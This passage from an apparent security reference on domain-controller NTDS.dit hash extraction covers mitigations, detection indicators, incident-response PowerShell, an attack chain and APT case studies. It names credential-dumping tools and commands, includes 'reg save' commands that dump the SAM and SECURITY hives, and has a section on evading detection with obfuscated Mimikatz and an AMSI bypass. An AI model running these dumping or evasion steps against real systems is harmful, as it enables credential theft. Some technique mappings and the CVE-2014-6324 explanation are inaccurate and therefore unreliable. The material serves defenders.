**Manual Steps (PowerShell):**

```powershell
# Enable DS audit logging
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Directory Service Access"
# Expected: Directory Service Access Success and Failure
```

---

**3. Implement NTDS Backup Security**

Protect backup files containing NTDS dumps.

**Applies To Versions:** All DC versions

**Manual Steps:**

1. Set restrictive ACLs on backup folders:
   ```cmd
   icacls "C:\Backups\NTDS" /inheritance:r /grant:r "SYSTEM:(F)" /grant:r "Administrators:(F)"
   ```

2. Encrypt backup disks (BitLocker)
3. Store in physically secure location
4. Restrict admin access via role separation
5. Enable backup audit logging

**PowerShell:**

```powershell
# Set restrictive permissions on NTDS backups
$BackupPath = "C:\Backups\NTDS"
$ACL = Get-Acl -Path $BackupPath
$ACL.SetAccessRuleProtection($true, $true)  # Disable inheritance

# Clear all ACEs
$ACL.Access | ForEach-Object { $ACL.RemoveAccessRule($_) }

# Add only SYSTEM and required admins
$SYSTEM = New-Object System.Security.AccessControl.FileSystemAccessRule(
  "NT AUTHORITY\SYSTEM",
  [System.Security.AccessControl.FileSystemRights]::FullControl,
  [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
  [System.Security.AccessControl.PropagationFlags]::None,
  [System.Security.AccessControl.AccessControlType]::Allow
)
$ACL.AddAccessRule($SYSTEM)
Set-Acl -Path $BackupPath -AclObject $ACL
```

---

### Priority 2: HIGH

**4. Implement Credential Guard on Domain Controllers**

Isolate sensitive credentials in virtualized environment.

**Applies To Versions:** Server 2016+ (with Hyper-V capable hardware)

**Manual Steps (PowerShell):**

```powershell
# Enable Credential Guard via Group Policy
# Computer Configuration → Administrative Templates → System → Device Guard
# Set "Turn on Virtualization Based Security" to "Enabled with UEFI lock"
# Set "Credential Guard Configuration" to "Enabled"

# Or via registry:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" `
  /v LsaCfgFlags /t REG_DWORD /d 1 /f
```

---

**5. Tier Domain Admin Accounts**

Minimize domain admin account exposure and reuse.

**Manual Steps:**

1. Create separate domain admin accounts for:
   - DC maintenance (Tier 0)
   - Server administration (Tier 1)
   - Workstation administration (Tier 2)

2. Restrict login locations per account
3. Disable interactive logon for sensitive accounts
4. Use Protected Users security group (Server 2012 R2+)

```powershell
# Add sensitive account to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "domain\tier0admin"

# Verify
Get-ADGroupMember -Identity "Protected Users" | Select Name
```

---

**6. Implement MFA for Administrative Access**

Require multi-factor authentication for DC access.

**Manual Steps (Azure AD Connect Sync):**

1. Configure conditional access in Entra ID
2. Require MFA for Domain Admin role assignments
3. Use Privileged Identity Management (PIM) for just-in-time admin access
4. Enforce device compliance for admin sessions

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Processes:**
- `mimikatz.exe` (any location)
- `secretsdump.py` execution
- `ntdsutil.exe` with "ifm" arguments
- `esentutl.exe` with `/vss` flag
- `vssadmin.exe` create/expose commands
- `diskshadow.exe` execution

**Files:**
- `C:\temp\ntds.dit`, `C:\temp\NTDS.dit`
- `C:\temp\system` (SYSTEM hive)
- `C:\ntds_backup\` or similar IFM backup folders
- Symbolic links to VSS (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*`)

**Network:**
- RPC traffic (port 135) from non-DC endpoints to DC
- LDAP operations (port 389/636) with replication parameters
- SMB traffic (port 445) for secretsdump.py

**Registry:**
- Access to `HKLM\SECURITY` (SYSTEM hive read)
- Access to `HKLM\SAM` (local admin dump)

**Event Log Indicators:**
- Event ID 4662 (DS Access) with replication properties
- Event ID 4663 (Object access) to ntds.dit path
- Event ID 4656 (Handle requested) for system hives

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` (Events 4662, 4663, 4656)
- Temporary files in `%TEMP%`, `C:\temp\`
- IFM backup folders with ntds.dit copies
- Deleted file entries in MFT (recovery tools)

**Memory:**
- Mimikatz.exe process memory (contains extracted hashes)
- RPC/LDAP connection handles in svchost.exe
- Credential Guard isolated partition (if EDR analyzing)

**Cloud (Hybrid AD):**
- Azure Sentinel logs showing replication events
- Azure audit logs for suspicious admin activity
- Entra ID sign-in logs from compromised accounts

### Response Procedures

**1. Immediate Containment:**

```powershell
# Isolate affected domain controller (if possible)
# Option 1: Disable network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Option 2: Isolate in Azure
# Go to Azure Portal → Virtual Machine → Networking → Detach NICs

# Option 3: Snapshot for forensics BEFORE remediation
# Create VM snapshot to preserve evidence
```

**2. Credential Reset (Critical - Assume Full AD Compromise):**

```powershell
# If NTDS.dit compromised, assume ALL domain passwords are at risk

# Step 1: Reset krbtgt password TWICE (purges all Kerberos tickets)
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString "TempPassword123!$(Get-Random)" -AsPlainText -Force)

# Wait 10 hours (krbtgt replication time)
Start-Sleep -Seconds 36000

# Reset AGAIN (different password)
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString "FinalPassword456!$(Get-Random)" -AsPlainText -Force)

# Step 2: Reset ALL domain user passwords (parallelized)
$Users = Get-ADUser -Filter {Enabled -eq $true}
$Users | ForEach-Object -Parallel {
  $TempPass = ConvertTo-SecureString "TempPass123!$(Get-Random)" -AsPlainText -Force
  Set-ADAccountPassword -Identity $_.SamAccountName -NewPassword $TempPass
  Set-ADUser -Identity $_.SamAccountName -ChangePasswordAtLogon $true
}

# Step 3: Force password change for domain admins (immediately)
Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
  $Pass = ConvertTo-SecureString "AdminPass789!$(Get-Random)" -AsPlainText -Force
  Set-ADAccountPassword -Identity $_.SamAccountName -NewPassword $Pass
  Set-ADUser -Identity $_.SamAccountName -ChangePasswordAtLogon $true
}
```

**3. Collect Evidence:**

```powershell
# Export Security logs
wevtutil epl Security C:\Evidence\Security.evtx
wevtutil epl System C:\Evidence\System.evtx

# Export NTDS.dit and registry hives (for forensics)
reg save hklm\sam C:\Evidence\SAM.hive
reg save hklm\system C:\Evidence\SYSTEM.hive
reg save hklm\security C:\Evidence\SECURITY.hive

# Memory capture (if available)
# procdump64.exe -ma <PID> C:\Evidence\memory.dmp
```

**4. Threat Hunt Post-Incident:**

```powershell
# Search for lateral movement attempts post-compromise
$StartTime = (Get-Date).AddDays(-30)
Get-ADComputer -Filter * | ForEach-Object {
  Get-EventLog -ComputerName $_.Name -LogName Security -After $StartTime `
    -InstanceId 4688 | Where-Object {$_.Message -like "*mimikatz*"}
}

# Check for new admin accounts created
Get-ADUser -Filter {adminCount -eq 1} -Properties WhenCreated | `
  Where-Object {$_.WhenCreated -gt $StartTime}
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing | Attacker gains initial foothold |
| **2** | **Execution** | [T1204.002] User Execution | Victim executes malicious file |
| **3** | **Persistence** | [T1547.001] Autostart Execution | Malware establishes persistence |
| **4** | **Privilege Escalation** | [T1134] Access Token Manipulation | Attacker escalates to domain user |
| **5** | **Privilege Escalation** | [T1548] Bypass User Account Control | Attacker escalates to admin |
| **6** | **Credential Access** | **[CA-DUMP-006] NTDS Extraction** | **Attacker dumps domain hashes** |
| **7** | **Lateral Movement** | [T1550.002] Pass-the-Hash | Attacker moves laterally using hashes |
| **8** | **Credential Access** | [T1558.001] Golden Ticket | Attacker creates forged Kerberos tickets using krbtgt hash |
| **9** | **Impact** | [T1490] Data Encrypted/Destroyed | Attacker deploys ransomware domain-wide |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT28 – Targeted Government Networks (2015-2018)

- **Target:** US Government agencies, NATO allies
- **Timeline:** 2015-2018
- **Technique Status:** APT28 used ntdsutil.exe to export NTDS.dit from compromised domain controllers. Extracted krbtgt hashes to create Golden Tickets for persistence.
- **Impact:** Long-term access to classified systems; exfiltration of military specifications
- **Reference:** [MITRE ATT&CK - APT28](https://attack.mitre.org/groups/G0007/)

---

### Example 2: HAFNIUM – Exchange Server Exploitation (2021)

- **Target:** US Government agencies, healthcare, financial institutions
- **Timeline:** 2021 (ProxyShell/ProxyLogon)
- **Technique Status:** HAFNIUM exploited Exchange Server vulnerabilities, then dumped NTDS.dit from compromised DCs. Used extracted credentials for further penetration.
- **Impact:** Access to sensitive medical/financial records; credential harvesting at scale
- **Reference:** [MITRE ATT&CK - HAFNIUM](https://attack.mitre.org/groups/G0125/)

---

### Example 3: Wizard Spider – UNC1878 Ransomware Campaign (2019-2021)

- **Target:** US healthcare organizations (hospitals)
- **Timeline:** 2019-2021
- **Technique Status:** Wizard Spider (UNC1878) used lsadump::dcsync (Mimikatz) to extract NTDS.dit from compromised DCs. Used krbtgt hash to forge Golden Tickets for persistence, then deployed Ryuk ransomware.
- **Impact:** $1.1B in ransomware payments; hospital outages affecting emergency care
- **Reference:** [MITRE ATT&CK - Wizard Spider/UNC1878](https://attack.mitre.org/groups/G0102/)

---

## 18. SIGNATURE DETECTION EVASION

### Detection Evasion Techniques

**1. Obfuscated Mimikatz:**
- Use modified/obfuscated Mimikatz builds
- Strip signatures, encode strings
- Execute from memory (no disk drop)
- AMSI bypass before execution

**2. Living-off-the-Land Alternative - CrackMapExec:**
- CrackMapExec has integrated secretsdump functionality
- May evade some AV signatures (Impacket-based)
- Network-based (less endpoint detection)

**3. Timing/Scheduling:**
- Execute DCSync during business hours
- Blend with normal admin activity
- Distributed across multiple sessions

**4. Credential Guard Bypass:**
- On Credential Guard-protected systems, DCSync still works
- But krbtgt hash may not be extractable in plaintext
- Use offline NTDS analysis with DSInternals instead

### Recommended Detection Tuning

- **Whitelist legitimate replication:** Exclude DC-to-DC replication traffic
- **Baseline admin activity:** Establish normal ntdsutil/esentutl usage patterns
- **Alert on suspicious combinations:** e.g., ntdsutil + file copy to network share in same session
- **Monitor backup locations:** Restrict access to IFM backup folders

---

## APPENDIX: CVE-2014-6324 Context (Kerberos PAC Validation)

While CVE-2014-6324 is not a direct NTDS extraction vulnerability, it is related through post-exploitation use of extracted krbtgt hashes.

**Vulnerability:** Windows Kerberos fails to properly validate the Privilege Attribute Certificate (PAC) in Kerberos tickets, allowing attackers to forge admin tickets.

**Exploitation Chain:**
1. Extract krbtgt hash from NTDS.dit (this technique)
2. Use krbtgt hash to forge Golden Ticket with arbitrary PAC (CVE-2014-6324 context)
3. Present forged ticket for domain admin access
4. Patched in MS14-068 (November 2014)

**Mitigation:** Apply KB3011780 or later; however, krbtgt hash extraction itself remains unpatched.
